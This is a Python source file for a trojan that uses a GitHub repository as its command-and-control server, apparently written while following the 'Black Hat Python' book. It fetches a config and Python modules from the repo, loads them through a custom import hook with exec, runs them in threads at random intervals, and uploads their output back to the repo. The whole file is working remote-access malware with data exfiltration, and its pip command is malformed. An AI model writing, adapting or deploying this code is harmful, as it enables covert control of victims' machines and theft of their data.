import base64
import shlex

import github3
import importlib
import json
import random
import sys
import threading
import time
import subprocess


from datetime import datetime


def github_connect():
    with open('token.txt') as f:
        token = f.read()

        user = 'Dedede12345'
        sess = github3.login(token=token)
        return sess.repository(user, "bhp_trojan")


def get_file_contents(dirname, module_name, repo):
    return repo.file_contents(f"{dirname}/{module_name}").content


class Trojan:

    def __init__(self, id):
        self.id = id
        self.config_file = f"{id}.json"
        self.data_path = f"data/{id}"
        self.repo = github_connect()

    def get_config(self):
        config_json = get_file_contents(
            'config', self.config_file, self.repo
        )

        config = json.loads(base64.b64decode(config_json))

        for task in config:
            if task['module'] not in sys.modules:
                exec("import %s" % task['module'])

        return config

    def module_runner(self, module):

        result = sys.modules[module].run()
        self.store_module_result(result, name=module)


    def store_module_result(self, data, name=None):
        message = datetime.now().isoformat()
        remote_path = f"data/{self.id}/{name}_{message}.data"
        bindata = bytes(str(data), 'utf-8')
        self.repo.create_file(
            remote_path, message, bindata
        )

    def run(self):
        while True:
            config = self.get_config()
            for task in config:
                thread = threading.Thread(
                    target=self.module_runner, args=(task['module'], )
                )
                thread.start()
                time.sleep(random.randint(1, 10))

            time.sleep(random.randint(30*60, 3*60*60))


class GitImporter:

    def __init__(self):
        self.current_module_code = ""

    def find_module(self, name, path=None):

        print("[*] Attempting to retrieve %s" % name)
        self.repo = github_connect()
        new_library = get_file_contents('modules', f'{name}.py', self.repo)
        if new_library:
            self.current_module_code = base64.b64decode(new_library)
            return self

    def load_module(self, name):
        spec = importlib.util.spec_from_loader(name, loader=None, origin=self.repo.git_url)
        new_module = importlib.util.module_from_spec(spec)
        exec(self.current_module_code, new_module.__dict__)
        sys.modules[spec.name] = new_module
        return new_module

def install_dependencies():
    dependencies = """certifi==2022.12.7
cffi==1.15.1
charset-normalizer==3.1.0
cryptography==40.0.1
github3.py==3.2.0
idna==3.4
kamene==0.32
numpy==1.24.2
opencv-python==4.7.0.72
pycparser==2.21
PyJWT==2.6.0
python-dateutil==2.8.2
requests==2.28.2
scapy==2.5.0
six==1.16.0
uritemplate==4.1.1
urllib3==1.26.15"""
    with open("requirements.txt", 'w') as f:
        f.writelines(dependencies)
    cmd = "pip -r install requirements.txt"
    subprocess.check_output(
        shlex.split(cmd), shell=True
    )

if __name__ == "__main__":
    sys.meta_path.append(GitImporter())
    install_dependencies()
    trojan = Trojan("abc")
    trojan.run()